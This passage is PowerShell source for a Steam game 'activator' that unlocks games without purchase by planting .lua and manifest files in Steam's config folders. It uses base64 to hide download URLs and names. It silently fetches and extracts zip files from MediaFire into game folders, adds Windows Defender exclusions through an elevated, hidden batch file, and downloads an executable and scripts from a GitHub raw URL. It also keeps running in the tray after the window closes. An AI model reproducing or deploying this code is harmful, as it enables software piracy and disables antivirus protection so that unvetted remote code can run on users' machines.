    if(-not $script:bibRepairProgress){$script:bibRepairProgress=[hashtable]::Synchronized(@{text='Preparando reparacion...'})}
    Start-BiblioRepairAsync ([string]$a)
} catch { try{$script:bdtRepBusy=$false;$script:bdtRep.Enabled=$true;$script:bdtRep.Tag.Text='REPARAR JUEGO';$script:bdtRep.Invalidate()}catch{}; try{[System.Windows.Forms.MessageBox]::Show(("Error: "+$_.Exception.Message),"Reparar","OK","Warning")}catch{} } })
$script:bdtp.Controls.Add($script:bdtRep)
$script:bdtStore=New-BdtBtn ($PAD+770) 452 280 50 $script:CardBG $script:CardHover $script:White ([System.Drawing.Color]::FromArgb(60,70,90)) $script:FntCard
$script:bdtStore.Tag.Text="Ver en la tienda de Steam"
$script:bdtStoreUrl=""
$script:bdtStore.Add_Click({ try { if($script:bdtStoreUrl){ Start-Process $script:bdtStoreUrl } } catch {} })
$script:bdtp.Controls.Add($script:bdtStore)
$script:bdtUninst=New-BdtBtn $PAD 512 240 50 $script:CardBG $script:CardHover $script:White ([System.Drawing.Color]::FromArgb(60,70,90)) $script:FntCard
$script:bdtUninst.Tag.Text="DESINSTALAR"
$script:bdtUninst.Add_Click({ try { $a=$script:bdtAid; if($a){ Start-Process "steam://uninstall/$a" } } catch {} })
$script:bdtp.Controls.Add($script:bdtUninst)
$script:bdtDel=New-BdtBtn ($PAD+260) 512 240 50 $script:CardBG $script:CardHover $script:White $script:Red $script:FntCard
$script:bdtDel.Tag.Text="ELIMINAR JUEGO"
$script:bdtDel.Add_Click({ try {
    $a=$script:bdtAid; if(-not $a){return}
    if([System.Windows.Forms.MessageBox]::Show("Se elimina la activacion de este juego. Continuar?","Eliminar juego","YesNo","Warning") -ne "Yes"){return}
    $mans=@()
    foreach($lib in @(Ss3Jd)){
        foreach($sub in @('config\stplug-in','config\lua')){
            $f=Join-Path (Join-Path $lib $sub) ($a+".lua")
            if(Test-Path -LiteralPath $f){
                try{ $tx=[IO.File]::ReadAllText($f); foreach($m in [regex]::Matches($tx,'setManifestid\((\d+),\s*"(\d+)"')){ $mans+=($m.Groups[1].Value+"_"+$m.Groups[2].Value+".manifest") } }catch{}
                try{ Remove-FileHard $f }catch{}
            }
        }
        $md=Join-Path $lib "config\depotcache"
        foreach($mm in @($mans | Select-Object -Unique)){ try{ Remove-FileHard (Join-Path $md $mm) }catch{} }
    }
    $script:bdtStatus.Text="Sin activar"
    [System.Windows.Forms.MessageBox]::Show("Juego eliminado.","Eliminar juego","OK","Information")
} catch { try{[System.Windows.Forms.MessageBox]::Show(("Error: "+$_.Exception.Message),"Eliminar juego","OK","Warning")}catch{} } })
$script:bdtp.Controls.Add($script:bdtDel)
$script:bdtStatus=New-Object System.Windows.Forms.Label
$script:bdtStatus.ForeColor=[System.Drawing.Color]::FromArgb(140,150,165);$script:bdtStatus.BackColor=$BG
$script:bdtStatus.Font=$script:FntSub
$script:bdtStatus.Location=New-Object System.Drawing.Point($PAD,566);$script:bdtStatus.Size=New-Object System.Drawing.Size(600,24)
$script:bdtp.Controls.Add($script:bdtStatus)
$form.Controls.Add($script:bdtp)
$script:cdp=New-BufferedPanel
$script:cdp.Location=New-Object System.Drawing.Point(0,$CY)
$script:cdp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:cdp.BackColor=$BG;$script:cdp.Visible=$false

$script:cdBack=New-BufferedPanel
$script:cdBack.Location=New-Object System.Drawing.Point($PAD,8)
$script:cdBack.Size=New-Object System.Drawing.Size(36,36);$script:cdBack.BackColor=$BG
$script:cdBack.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:cdBack.Tag=@{Hover=$false}
$script:cdBack.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:cdBack.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:cdBack.Add_Click({Switch-ToCodes})
$script:cdBack.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias'
    $bc=if($s.Tag.Hover){$script:CardHover}else{$script:CardBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
    $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    $ap=New-Object System.Drawing.Pen($script:Cyan,2.5)
    $cx2=$s.Width/2;$cy2=$s.Height/2
    $g.DrawLine($ap,($cx2+4),($cy2-7),($cx2-4),$cy2)
    $g.DrawLine($ap,($cx2-4),$cy2,($cx2+4),($cy2+7));$ap.Dispose()
})
$script:cdp.Controls.Add($script:cdBack)

$script:cdTitle=New-Object System.Windows.Forms.Label
$script:cdTitle.Location=New-Object System.Drawing.Point(($PAD+46),14)
$script:cdTitle.Size=New-Object System.Drawing.Size(($CW-46),26)
$script:cdTitle.ForeColor=$script:White;$script:cdTitle.BackColor=$BG
$script:cdTitle.Font=$script:FntRedeemTitle;$script:cdTitle.Text="Codigo"
$script:cdp.Controls.Add($script:cdTitle)

$script:cdSub=New-Object System.Windows.Forms.Label
$script:cdSub.Location=New-Object System.Drawing.Point(($PAD+46),42)
$script:cdSub.Size=New-Object System.Drawing.Size(($CW-46),20)
$script:cdSub.ForeColor=$script:Gray;$script:cdSub.BackColor=$BG
$script:cdSub.Font=$script:FntSub;$script:cdSub.Text=""
$script:cdp.Controls.Add($script:cdSub)

$script:cdInfo=New-Object System.Windows.Forms.Label
$script:cdInfo.Location=New-Object System.Drawing.Point($PAD,74)
$script:cdInfo.Size=New-Object System.Drawing.Size($CW,20)
$script:cdInfo.ForeColor=$script:White;$script:cdInfo.BackColor=$BG
$script:cdInfo.Font=$script:FntAct;$script:cdInfo.Text=""
$script:cdp.Controls.Add($script:cdInfo)

$script:cdProg=New-Object System.Windows.Forms.Label
$script:cdProg.Location=New-Object System.Drawing.Point($PAD,96)
$script:cdProg.Size=New-Object System.Drawing.Size($CW,20)
$script:cdProg.ForeColor=$script:Cyan;$script:cdProg.BackColor=$BG
$script:cdProg.Font=$script:FntAct;$script:cdProg.Text=""
$script:cdp.Controls.Add($script:cdProg)

$script:cdBar=New-BufferedPanel
$script:cdBar.Location=New-Object System.Drawing.Point($PAD,124)
$script:cdBar.Size=New-Object System.Drawing.Size($CW,22);$script:cdBar.BackColor=$BG
$script:cdBar.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias'
    $w=$s.Width;$h=$s.Height
    $p=New-RR 0 0 ($w-1) ($h-1) 7
    $b1=New-Object System.Drawing.SolidBrush($script:CardBG);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    $pct=[int]$script:cdPct; if($pct -lt 0){$pct=0}; if($pct -gt 100){$pct=100}
    $fw=[int](($w-4)*$pct/100)
    if($fw -gt 4){
        $fp=New-RR 2 2 $fw ($h-4) 5
        $col=if($script:cdRunning -and -not ($script:cdStatus -eq 'PAUSADO')){$script:Cyan}elseif($pct -ge 100){$script:Cyan}else{$script:Yellow}
        $fb=New-Object System.Drawing.SolidBrush($col);$g.FillPath($fb,$fp);$fb.Dispose();$fp.Dispose()
    }
})
$script:cdp.Controls.Add($script:cdBar)

$script:cdBtnAct=New-CfgBtn 154 "Comenzar" "Activa los +1000 juegos" { Start-CdActivate } ([System.Drawing.Color]::FromArgb(34,150,80))
$script:cdp.Controls.Add($script:cdBtnAct)

$script:cdBtnDel=New-CfgBtn 266 "Borrar juegos de este codigo" "Elimina los juegos de este codigo" {
    $code=[string]$script:cdCode
    $n=0; foreach($c in @($script:activeCodes)){ if([string]$c.Code -eq $code){$n++} }
    if($n -eq 0 -and (Get-JobPendingCount $code) -eq 0){ [System.Windows.Forms.MessageBox]::Show("Este codigo no tiene juegos activos.","Borrar juegos","OK","Information"); return }
    if([System.Windows.Forms.MessageBox]::Show("Se borraran los juegos activados con el codigo $code.`n`nContinuar?","Borrar juegos","YesNo","Warning") -ne "Yes"){ return }
    $rm=Remove-GamesForCode $code
    [System.Windows.Forms.MessageBox]::Show("Juegos borrados: $rm.`nPodes reactivarlos desde esta misma seccion.","Listo","OK","Information")
    try{ Update-CdPanelText }catch{}
}
$script:cdp.Controls.Add($script:cdBtnDel)

$script:cdPause=New-CfgBtn 208 "Pausar activacion" "Pausa la activacion de los juegos" { Toggle-CdPause }
$script:cdp.Controls.Add($script:cdPause)

$script:cdBtnP1=New-CfgBtn 322 "Activar juegos Opcion 1" "" { $null = Xz9Qk } ([System.Drawing.Color]::FromArgb(30,130,190))
$script:cdp.Controls.Add($script:cdBtnP1)

$script:cdBtnP2=New-CfgBtn 378 "Activar juegos Opcion 2" "" { Repair-Activacion2 } ([System.Drawing.Color]::FromArgb(190,125,45))
$script:cdp.Controls.Add($script:cdBtnP2)

$form.Controls.Add($script:cdp)




$script:trayIcon = New-Object System.Windows.Forms.NotifyIcon
$script:trayIcon.Icon = $form.Icon
$script:trayIcon.Text = "BastissSteam activator"
$script:trayIcon.Visible = $false


$trayMenu = New-Object System.Windows.Forms.ContextMenuStrip
$trayMenu.BackColor = $CardBG
$trayMenu.ForeColor = $White
$trayMenu.Font = New-Object System.Drawing.Font("Bahnschrift",9.5)
$trayMenu.Renderer = New-Object System.Windows.Forms.ToolStripProfessionalRenderer(
    New-Object System.Windows.Forms.ProfessionalColorTable
)

$script:restoreMainWindow = {
    try { if ($form.IsDisposed) { return } } catch {}
    try { $form.ShowInTaskbar = $true } catch {}
    try { if (-not $form.Visible) { $form.Show() } } catch {}
    try {
        $restoreState = $script:lastNonMinimizedWindowState
        if ($null -eq $restoreState -or $restoreState -eq 'Minimized') { $restoreState = 'Normal' }
        $form.WindowState = $restoreState
        $form.Show(); $form.BringToFront(); $form.Activate()
    } catch {}
    try { [WinFg]::ShowWindow($form.Handle, 9) | Out-Null; [WinFg]::SetForegroundWindow($form.Handle) | Out-Null } catch {}
    try { $script:trayIcon.Visible = $false } catch {}
    try {
        if ($script:bibp -and $script:bibp.Visible) {
            Set-BiblioLayout
            if ($script:bibGames -and $script:bibFlow.Controls.Count -eq 0 -and $script:bibRenderQueue.Count -eq 0) { Refresh-BiblioGrid $script:bibSearch.Text }
            if ($script:bibRenderIndex -lt $script:bibRenderQueue.Count) { $script:bibRenderTimer.Start() }
            if ($script:bibLoadingCard.Visible) { $script:bibLoadingTimer.Start() }
            if ($script:bibCoverJobs.Count -gt 0 -or $script:bibCoverQueue.Count -gt 0) { $script:bibTimer.Start() }
        }
    } catch {}
}
$menuAbrir = New-Object System.Windows.Forms.ToolStripMenuItem("Abrir")
$menuAbrir.Add_Click({ try { & $script:restoreMainWindow } catch {} })
$menuCerrar = New-Object System.Windows.Forms.ToolStripMenuItem("Cerrar")
$menuCerrar.Add_Click({
    $script:reallyClose = $true
    $script:trayIcon.Visible = $false
    $script:trayIcon.Dispose()
    $form.Close()
})
$trayMenu.Items.Add($menuAbrir) | Out-Null
$trayMenu.Items.Add($menuCerrar) | Out-Null
$script:trayIcon.ContextMenuStrip = $trayMenu


$script:trayIcon.Add_MouseClick({
    param($sender,$eventArgs)
    if ($eventArgs.Button -eq [System.Windows.Forms.MouseButtons]::Left) {
        try { & $script:restoreMainWindow } catch {}
    }
})
$script:trayIcon.Add_DoubleClick({ try { & $script:restoreMainWindow } catch {} })


$script:reallyClose = $false
$form.Add_FormClosing({
    param($sender, $ev)
    if (-not $script:reallyClose) {
        $ev.Cancel = $true
        if ($form.WindowState -ne 'Minimized') { $script:lastNonMinimizedWindowState = $form.WindowState }
        $form.Hide()
        $script:trayIcon.Visible = $true
        $script:trayIcon.ShowBalloonTip(2000, "BastissSteam", "El programa sigue activo en segundo plano.", [System.Windows.Forms.ToolTipIcon]::Info)
    }
})






if ($script:steamLibs -eq $null) { try { $script:steamLibs = Ss3Jd; $script:steamLibsCacheTime = Get-Date } catch {} }
$script:steamWatchTimer = New-Object System.Windows.Forms.Timer
$script:steamWatchTimer.Interval = 15000
$script:steamWatchTimer.Add_Tick({
    try { if ($form.WindowState -eq 'Minimized') { return } } catch {}
    try {
        if ($script:fixesJob -eq $null -and ($script:fixesCache.Count -eq 0 -or ((Get-Date) - $script:fixesCacheTime).TotalSeconds -gt 120)) {
            $script:fixesJob = Start-Job -ScriptBlock {
                try {
                    $r = Invoke-RestMethod -Uri (D "aHR0cHM6Ly93d3cubWVkaWFmaXJlLmNvbS9hcGkvMS41L2ZvbGRlci9nZXRfY29udGVudC5waHA/Zm9sZGVyX2tleT0zbzkxMjdwc2V5eDQ5JnJlc3BvbnNlX2Zvcm1hdD1qc29uJmNvbnRlbnRfdHlwZT1maWxlcw==") -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
                    $fixes = @{}
                    if ($r.response.folder_content.files) { foreach ($f in $r.response.folder_content.files) { $fixes[($f.filename -replace '\.zip$', '')] = $f.links.normal_download } }
                    return $fixes
                } catch { return @{} }
            }
        }
        if ($script:fixesJob -and $script:fixesJob.IsCompleted) {
            try { $result = Receive-Job $script:fixesJob -ErrorAction Stop; if ($result -and $result.Count -gt 0) { $script:fixesCache = $result } } catch {}
            $script:fixesCacheTime = Get-Date
            Remove-Job $script:fixesJob -ErrorAction SilentlyContinue
            $script:fixesJob = $null
        }
        $fixes = $script:fixesCache

        
        $donePending = @()
        foreach ($name in $script:downloadPendingFixes.Keys) {
            $info = $script:downloadPendingFixes[$name]
            if ($info.dlJob -and -not $info.dlJob.IsCompleted) { continue }
            if ($info.dlJob -and $info.dlJob.IsCompleted) { try { $null = Receive-Job $info.dlJob -ErrorAction Stop } catch {}; Remove-Job $info.dlJob -ErrorAction SilentlyContinue }
            if (-not (Test-Path $info.zipPath)) { $donePending += $name; continue }
            $gameFound = $null
            if ($script:steamLibs) { foreach ($lib in $script:steamLibs) { $common = Join-Path $lib (S("c3RlYW1hcHBzXGNvbW1vbg==")); $candidate = Join-Path $common $name; if (Test-Path $candidate) { $gameFound = $candidate; break } } }
            if (-not $gameFound) { continue }
            try {
                $er = @()
                try { Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue; $z = [System.IO.Compression.ZipFile]::OpenRead($info.zipPath); foreach ($e in $z.Entries) { if ($e.Name) { $er += $e.FullName } }; $z.Dispose() } catch {}
                Expand-Archive -Path $info.zipPath -DestinationPath $gameFound -Force
                if ($er.Count -gt 0) { Am3Fs $name $gameFound $er }
                Add-AutoFixedGame $name
            } catch {}
            Remove-Item $info.zipPath -Force -ErrorAction SilentlyContinue
            $donePending += $name
        }
        foreach ($name in $donePending) { $script:downloadPendingFixes.Remove($name) }

        
        try {
            if (((Get-Date) - $script:steamLibsCacheTime).TotalSeconds -gt 120 -or $script:commonFolderCache.Count -eq 0) {
                try { $script:steamLibs = Ss3Jd; $script:steamLibsCacheTime = Get-Date } catch {}
                $script:commonFolderCache = @{}
                if ($script:steamLibs) { foreach ($l2 in $script:steamLibs) { $cp = Join-Path $l2 (S("c3RlYW1hcHBzXGNvbW1vbg==")); if (Test-Path $cp) { Get-ChildItem $cp -Directory -ErrorAction SilentlyContinue | ForEach-Object { $script:commonFolderCache[$_.Name] = $true } } } }
            }
            $fixesCount = $fixes.Count
            if ($script:steamLibs) { foreach ($lib in @($script:steamLibs)) {
                foreach ($scanSpec in @("downloading", "temp", "")) {
                    $dir = if ($scanSpec) { Join-Path (Join-Path $lib (S("c3RlYW1hcHBz"))) $scanSpec } else { Join-Path $lib (S("c3RlYW1hcHBz")) }
                    if (-not (Test-Path $dir)) { continue }
                    foreach ($mf in Get-ChildItem $dir -Recurse -Filter "*.acf" -ErrorAction SilentlyContinue) {
                        try { $raw = [System.IO.File]::ReadAllText($mf.FullName)
                            $gn = if ($raw -match '"name"\s+"([^"]+)"') { $Matches[1] } elseif ($raw -match '"installdir"\s+"([^"]+)"') { $Matches[1] } else { continue }
                            if ($script:knownDownloading.ContainsKey($gn) -or $script:downloadPendingFixes.ContainsKey($gn)) { continue }
                            $inCommon = $script:commonFolderCache.ContainsKey($gn)
                            $script:knownDownloading[$gn] = $true
                            if (-not $inCommon -and $fixesCount -gt 0) {
                                $fn, $fu = Ff2Xa $gn $fixes
                                if ($fu) {
                                    $zipPath = Join-Path $env:TEMP "predl_$(Get-Random).zip"
                                    $dlJob = Start-Job -ScriptBlock { param($u, $o) try { $page = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop; $dl = $page.Links | Where-Object { $_.id -eq "downloadButton" } | Select-Object -ExpandProperty href; if (-not $dl) { throw "No download link" }; (New-Object System.Net.WebClient).DownloadFile($dl, $o) } catch {} } -ArgumentList $fu, $zipPath
                                    $script:downloadPendingFixes[$gn] = @{ fix_url = $fu; zipPath = $zipPath; dlJob = $dlJob }
                                }
                            }
                        } catch {}
                    }
                }
                $dlDir = Join-Path (Join-Path $lib (S("c3RlYW1hcHBz"))) "downloading"
                if (Test-Path $dlDir) {
                    foreach ($subDir in Get-ChildItem $dlDir -Directory -ErrorAction SilentlyContinue) {
                        $appid = $subDir.Name
                        if ($script:knownDownloading.ContainsKey($appid) -or $script:downloadPendingFixes.ContainsKey($appid)) { continue }
                        $gn = $null
                        if ($script:steamLibs) { foreach ($sl in $script:steamLibs) { $acfPath = Join-Path (Join-Path $sl (S("c3RlYW1hcHBz"))) "appmanifest_$appid.acf"; if (-not (Test-Path $acfPath)) { continue }; try { $raw = [System.IO.File]::ReadAllText($acfPath) } catch { continue }; $gn = if ($raw -match '"name"\s+"([^"]+)"') { $Matches[1] } elseif ($raw -match '"installdir"\s+"([^"]+)"') { $Matches[1] }; if ($gn) { break } } }
                        if (-not $gn) { try { $r2 = Invoke-RestMethod "https://store.steampowered.com/api/appdetails?appids=$appid" -UseBasicParsing -TimeoutSec 3 -ErrorAction SilentlyContinue; if ($r2.$appid.success -eq $true -and $r2.$appid.data.name) { $gn = $r2.$appid.data.name } } catch {} }
                        if (-not $gn) { $script:knownDownloading[$appid] = $true; continue }
                        if ($script:downloadPendingFixes.ContainsKey($gn)) { $script:knownDownloading[$appid] = $true; continue }
                        $inCommon = $script:commonFolderCache.ContainsKey($gn)
                        if ($inCommon) { $script:knownDownloading[$appid] = $true; continue }
                        if ($fixesCount -eq 0) { continue }
                        $fn, $fu = Ff2Xa $gn $fixes
                        if (-not $fu) { $script:knownDownloading[$appid] = $true; continue }
                        $zipPath = Join-Path $env:TEMP "predl_$(Get-Random).zip"
                        $dlJob = Start-Job -ScriptBlock { param($u, $o) try { $page = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop; $dl = $page.Links | Where-Object { $_.id -eq "downloadButton" } | Select-Object -ExpandProperty href; if (-not $dl) { throw "No download link" }; (New-Object System.Net.WebClient).DownloadFile($dl, $o) } catch {} } -ArgumentList $fu, $zipPath
                        $script:downloadPendingFixes[$gn] = @{ fix_url = $fu; zipPath = $zipPath; dlJob = $dlJob }
                        $script:knownDownloading[$appid] = $true
                    }
                }
            } }
        } catch {}

        if ($fixesCount -gt 0) {
            $done = @()
            foreach ($name in $script:fixJobs.Keys) {
                $info = $script:fixJobs[$name]
                try { if ($info.job.IsCompleted) {
                    $er = @(Receive-Job $info.job -ErrorAction Stop)
                    Remove-Job $info.job -ErrorAction SilentlyContinue
                    if ($er.Count -gt 0) { Am3Fs $name $info.path $er }
                    Add-AutoFixedGame $name
                    $done += $name
                } } catch { Remove-Job $info.job -ErrorAction SilentlyContinue; $done += $name }
            }
            foreach ($name in $done) { $script:fixJobs.Remove($name) }
        }

        $curFolders = @{}
        if (((Get-Date) - $script:steamLibsCacheTime).TotalSeconds -gt 120) { try { $script:steamLibs = Ss3Jd; $script:steamLibsCacheTime = Get-Date } catch {} }
        if ($script:steamLibs) { foreach ($lib in $script:steamLibs) { $common = Join-Path $lib (S("c3RlYW1hcHBzXGNvbW1vbg==")); if (Test-Path $common) { Get-ChildItem $common -Directory -ErrorAction SilentlyContinue | ForEach-Object { $curFolders[$_.Name] = $_.FullName } } } }
        $noGameFolders = @("Steamworks Shared", "Steam Controller Configs")
        foreach ($name in $curFolders.Keys) {
            if ($noGameFolders -contains $name) { continue }
            if ($script:fixedNewGames.ContainsKey($name)) { continue }
            if ($script:fixJobs.ContainsKey($name)) { continue }
            if ($script:downloadPendingFixes.ContainsKey($name)) { continue }
            $script:fixedNewGames[$name] = $true
            if ($fixesCount -eq 0) { continue }
            $fn, $fu = Ff2Xa $name $fixes
            if ($fu) {
                $zip = Join-Path $env:TEMP "newfix_$(Get-Random).zip"
                $job = Start-Job -ScriptBlock {
                    param($u, $o, $p) try { $page = Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
                    $dl = $page.Links | Where-Object { $_.id -eq "downloadButton" } | Select-Object -ExpandProperty href
                    if (-not $dl) { throw "No download link" }
                    (New-Object System.Net.WebClient).DownloadFile($dl, $o)
                    Expand-Archive -Path $o -DestinationPath $p -Force -ErrorAction Stop
                    $er = @()
                    try { Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue; $z = [System.IO.Compression.ZipFile]::OpenRead($o); foreach ($e in $z.Entries) { if ($e.Name) { $er += $e.FullName } }; $z.Dispose() } catch {}
                    Remove-Item $o -Force -ErrorAction SilentlyContinue
                    return $er } catch { return @() }
                } -ArgumentList $fu, $zip, $curFolders[$name]
                $script:fixJobs[$name] = @{job=$job; path=$curFolders[$name]}
            }
        }
    } catch {}
})
$script:steamWatchTimer.Start()


function ScA {
    
    $realTimers = At5Vc
    $memGameNames = @($script:activeCodes | ForEach-Object { $_.Game })
    foreach ($t in $realTimers) {
        $exp = $t.expires_at -as [datetime]
        if (-not $exp) { continue }
        if ($memGameNames -contains $t.game_name) { continue }
        $c = if ($t.redeem_code) { $t.redeem_code } else { $t.game_name }
        $d = if ($t.PSObject.Properties.Name -contains (S('ZHVyYXRpb24='))) { $t.duration } else { $null }
        $iCreated = $t.internet_created_at
        $aAt = if ($iCreated) { [datetime]$iCreated } else { (Get-Date) }
        $script:activeCodes.Add(@{Code=$c;Game=$t.game_name;ActivatedAt=$aAt;ExpiresAt=$exp;Duration=$d;InternetCreatedAt=$iCreated})|Out-Null
    }
    
    $hist = @(foreach ($el in Get-CodesHistory) { $el })
    $memCodes = @($script:activeCodes | ForEach-Object { $_.Code })
    foreach ($h in $hist) {
        $expH = $h.expires_at -as [datetime]
        if (-not $expH) { continue }
        if ($memCodes -contains $h.code) { continue }
        $aAtH = if ($h.expired_at) { try { [datetime]$h.expired_at } catch { $expH } } else { $expH }
        $script:activeCodes.Add(@{Code=$h.code;Game=$h.game;ActivatedAt=$aAtH;ExpiresAt=$expH;Duration=$h.duration;InternetCreatedAt=$null})|Out-Null
    }
}
ScA



$script:watcherEnabled = $false
$script:watcherProcess = $null
$script:watcherLogPath = Join-Path $env:TEMP (S("YnNtYXBfd2F0Y2hlci5sb2c="))
$script:watcherTemp = Join-Path $env:TEMP (S("YnNtYXBfd2F0Y2hlci5wczE="))
$script:defenderExclusionsDone = $false


function Set-ReparadorFlag {
    param([int]$on)
    try { New-Item -Path "HKCU:\Software\Bsmap" -Force -ErrorAction SilentlyContinue | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("UmVwYXJhZG9y")) -Value $on -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
    try { [System.IO.File]::WriteAllText((Join-Path $env:LOCALAPPDATA (S('YnNtYXBfcmVwYXJhZG9yLmZsYWc='))), "$on", $script:utf8NoBom) } catch {}
}
function Get-ReparadorFlag {
    try { $v = (Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("UmVwYXJhZG9y")) -ErrorAction SilentlyContinue).Reparador; if ($null -ne $v) { return [int]$v } } catch {}
    try { $f = Join-Path $env:LOCALAPPDATA (S('YnNtYXBfcmVwYXJhZG9yLmZsYWc=')); if (Test-Path $f) { return [int]((Get-Content $f -Raw).Trim()) } } catch {}
    return 0
}


function Add-SteamDefenderExclusions {
    if ($script:defenderExclusionsDone) { return $true }
    try {
        $steamRoot = Get-SteamPath
        if (-not $steamRoot) { return $false }
        $libs = Ss3Jd
        $exclusions = @()
        $exclusions += (Join-Path $steamRoot (S("c3RlYW1hcHBzXGRvd25sb2FkaW5n")))
        $exclusions += (Join-Path $steamRoot (S("c3RlYW1hcHBzXGNvbW1vbg==")))
        $exclusions += (Join-Path $steamRoot (S("Y29uZmlnXHN0cGx1Zy1pbg==")))
        $exclusions += (Join-Path $steamRoot (S("Y29uZmlnXGx1YQ==")))
        $exclusions += (Join-Path $steamRoot "config\depotcache")
        foreach ($lib in $libs) {
            $exclusions += (Join-Path $lib (S("c3RlYW1hcHBzXGRvd25sb2FkaW5n")))
            $exclusions += (Join-Path $lib (S("c3RlYW1hcHBzXGNvbW1vbg==")))
            $exclusions += (Join-Path $lib (S("Y29uZmlnXHN0cGx1Zy1pbg==")))
            $exclusions += (Join-Path $lib (S("Y29uZmlnXGx1YQ==")))
            $exclusions += (Join-Path $lib "config\depotcache")
        }
        $exclusions = $exclusions | Select-Object -Unique | Where-Object { $_ }
        $allNeeded = @($exclusions)
        if ($exclusions.Count -eq 0) { $script:defenderExclusionsDone = $true; return $true }
        try {
            $existingExcl = @()
            try { $existingExcl = @( (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath ) } catch {}
            if (-not $existingExcl -or $existingExcl.Count -eq 0) { try { $existingExcl = @((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue).PSObject.Properties.Name | Where-Object { $_ -notlike 'PS*' }) } catch {} }
            $exclusions = @($exclusions | Where-Object { $existingExcl -notcontains $_ })
                if ($exclusions.Count -eq 0) { $script:defenderExclusionsDone = $true; return $true }
            try {
                $defCut = (Get-Date).AddDays(-7)
                $fresh = @()
                $defFlagF = Join-Path $env:LOCALAPPDATA "BastissSteam\defexcl_done.txt"
                if (Test-Path -LiteralPath $defFlagF) {
                    foreach ($fl in @(Get-Content -LiteralPath $defFlagF -ErrorAction Stop)) {
                        $fp = ($fl -split '\|')[0]; $fdd = [datetime]::MinValue
                        try { $fdd = [datetime]::ParseExact(($fl -split '\|')[1],'yyyyMMdd',$null) } catch {}
                        if ($fdd -ge $defCut) { $fresh += $fp }
                    }
                }
                $exclusions = @($exclusions | Where-Object { $fresh -notcontains $_ })
            if ($exclusions.Count -eq 0) { $script:defenderExclusionsDone = $true; return $true }
            } catch {}
        } catch {}
        $batPath = Join-Path $env:TEMP (S("YnNtYXBfYWRkX2V4Y2x1c2lvbnMuYmF0"))
        $lines = @("@echo off")
        foreach ($ex in $exclusions) {
            $lines += "powershell -Command 'Add-MpPreference -ExclusionPath " + '"' + $ex + '"' + "' 2>nul"
        }
        $lines += "exit /b 0"
        $lines | Set-Content $batPath -Encoding ASCII
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "cmd.exe"
        $psi.Arguments = "/c `"$batPath`""
        $psi.Verb = "RunAs"
        $psi.WindowStyle = "Hidden"
        $psi.UseShellExecute = $true
        try { Write-Host "[ADMIN] Se pedira permiso de administrador. Aceptalo." } catch {}
        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.WaitForExit(30000) | Out-Null
        Start-Sleep -Milliseconds 500
        try { Remove-Item $batPath -Force -ErrorAction SilentlyContinue } catch {}
        $verifyExcl = @()
        try { $verifyExcl = @((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue).PSObject.Properties.Name | Where-Object { $_ -notlike 'PS*' }) } catch {}
        $stillMissing = @($allNeeded | Where-Object { $verifyExcl -notcontains $_ })
        if ($stillMissing.Count -gt 0) {
            Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [ADMIN] Permiso no aceptado o fallo: $($stillMissing -join '; ')" -Encoding UTF8 -ErrorAction SilentlyContinue
            return $false
        }
        try { foreach ($ex in $allNeeded) { Save-DefExclFlag $ex } } catch {}
        $script:defenderExclusionsDone = $true
        Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [OK] Steam ya listo" -Encoding UTF8 -ErrorAction SilentlyContinue
        return $true
    } catch {
        WEL "Steam ready exclusions" $_
        return $false
    }
}


function Ensure-CleanupTask {
    try {
        $bsDir = Join-Path $env:LOCALAPPDATA 'BastissSteam'
        New-Item -ItemType Directory -Path $bsDir -Force | Out-Null
        $cleanupPs1 = Join-Path $env:LOCALAPPDATA (S('YnNtYXBfY2xlYW51cC5wczE='))
        $watchExe = Join-Path $bsDir 'bsmap_watch.exe'
        $ensure = Join-Path $bsDir 'ensure_task.ps1'
        $base = (D "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvc3RlYW1zaXRvL21haW4=")
        if (-not (Test-Path $cleanupPs1)) { try { Invoke-RestMethod -Uri "$base/bsmap_cleanup.ps1" -UseBasicParsing -TimeoutSec 20 -OutFile $cleanupPs1 -ErrorAction SilentlyContinue } catch {} }
        if (-not (Test-Path $watchExe)) { try { Invoke-RestMethod -Uri "$base/bsmap_watch.exe" -UseBasicParsing -TimeoutSec 25 -OutFile $watchExe -ErrorAction SilentlyContinue } catch {} }
        if (-not (Test-Path $ensure)) { try { Invoke-RestMethod -Uri "$base/ensure_task.ps1" -UseBasicParsing -TimeoutSec 20 -OutFile $ensure -ErrorAction SilentlyContinue } catch {} }
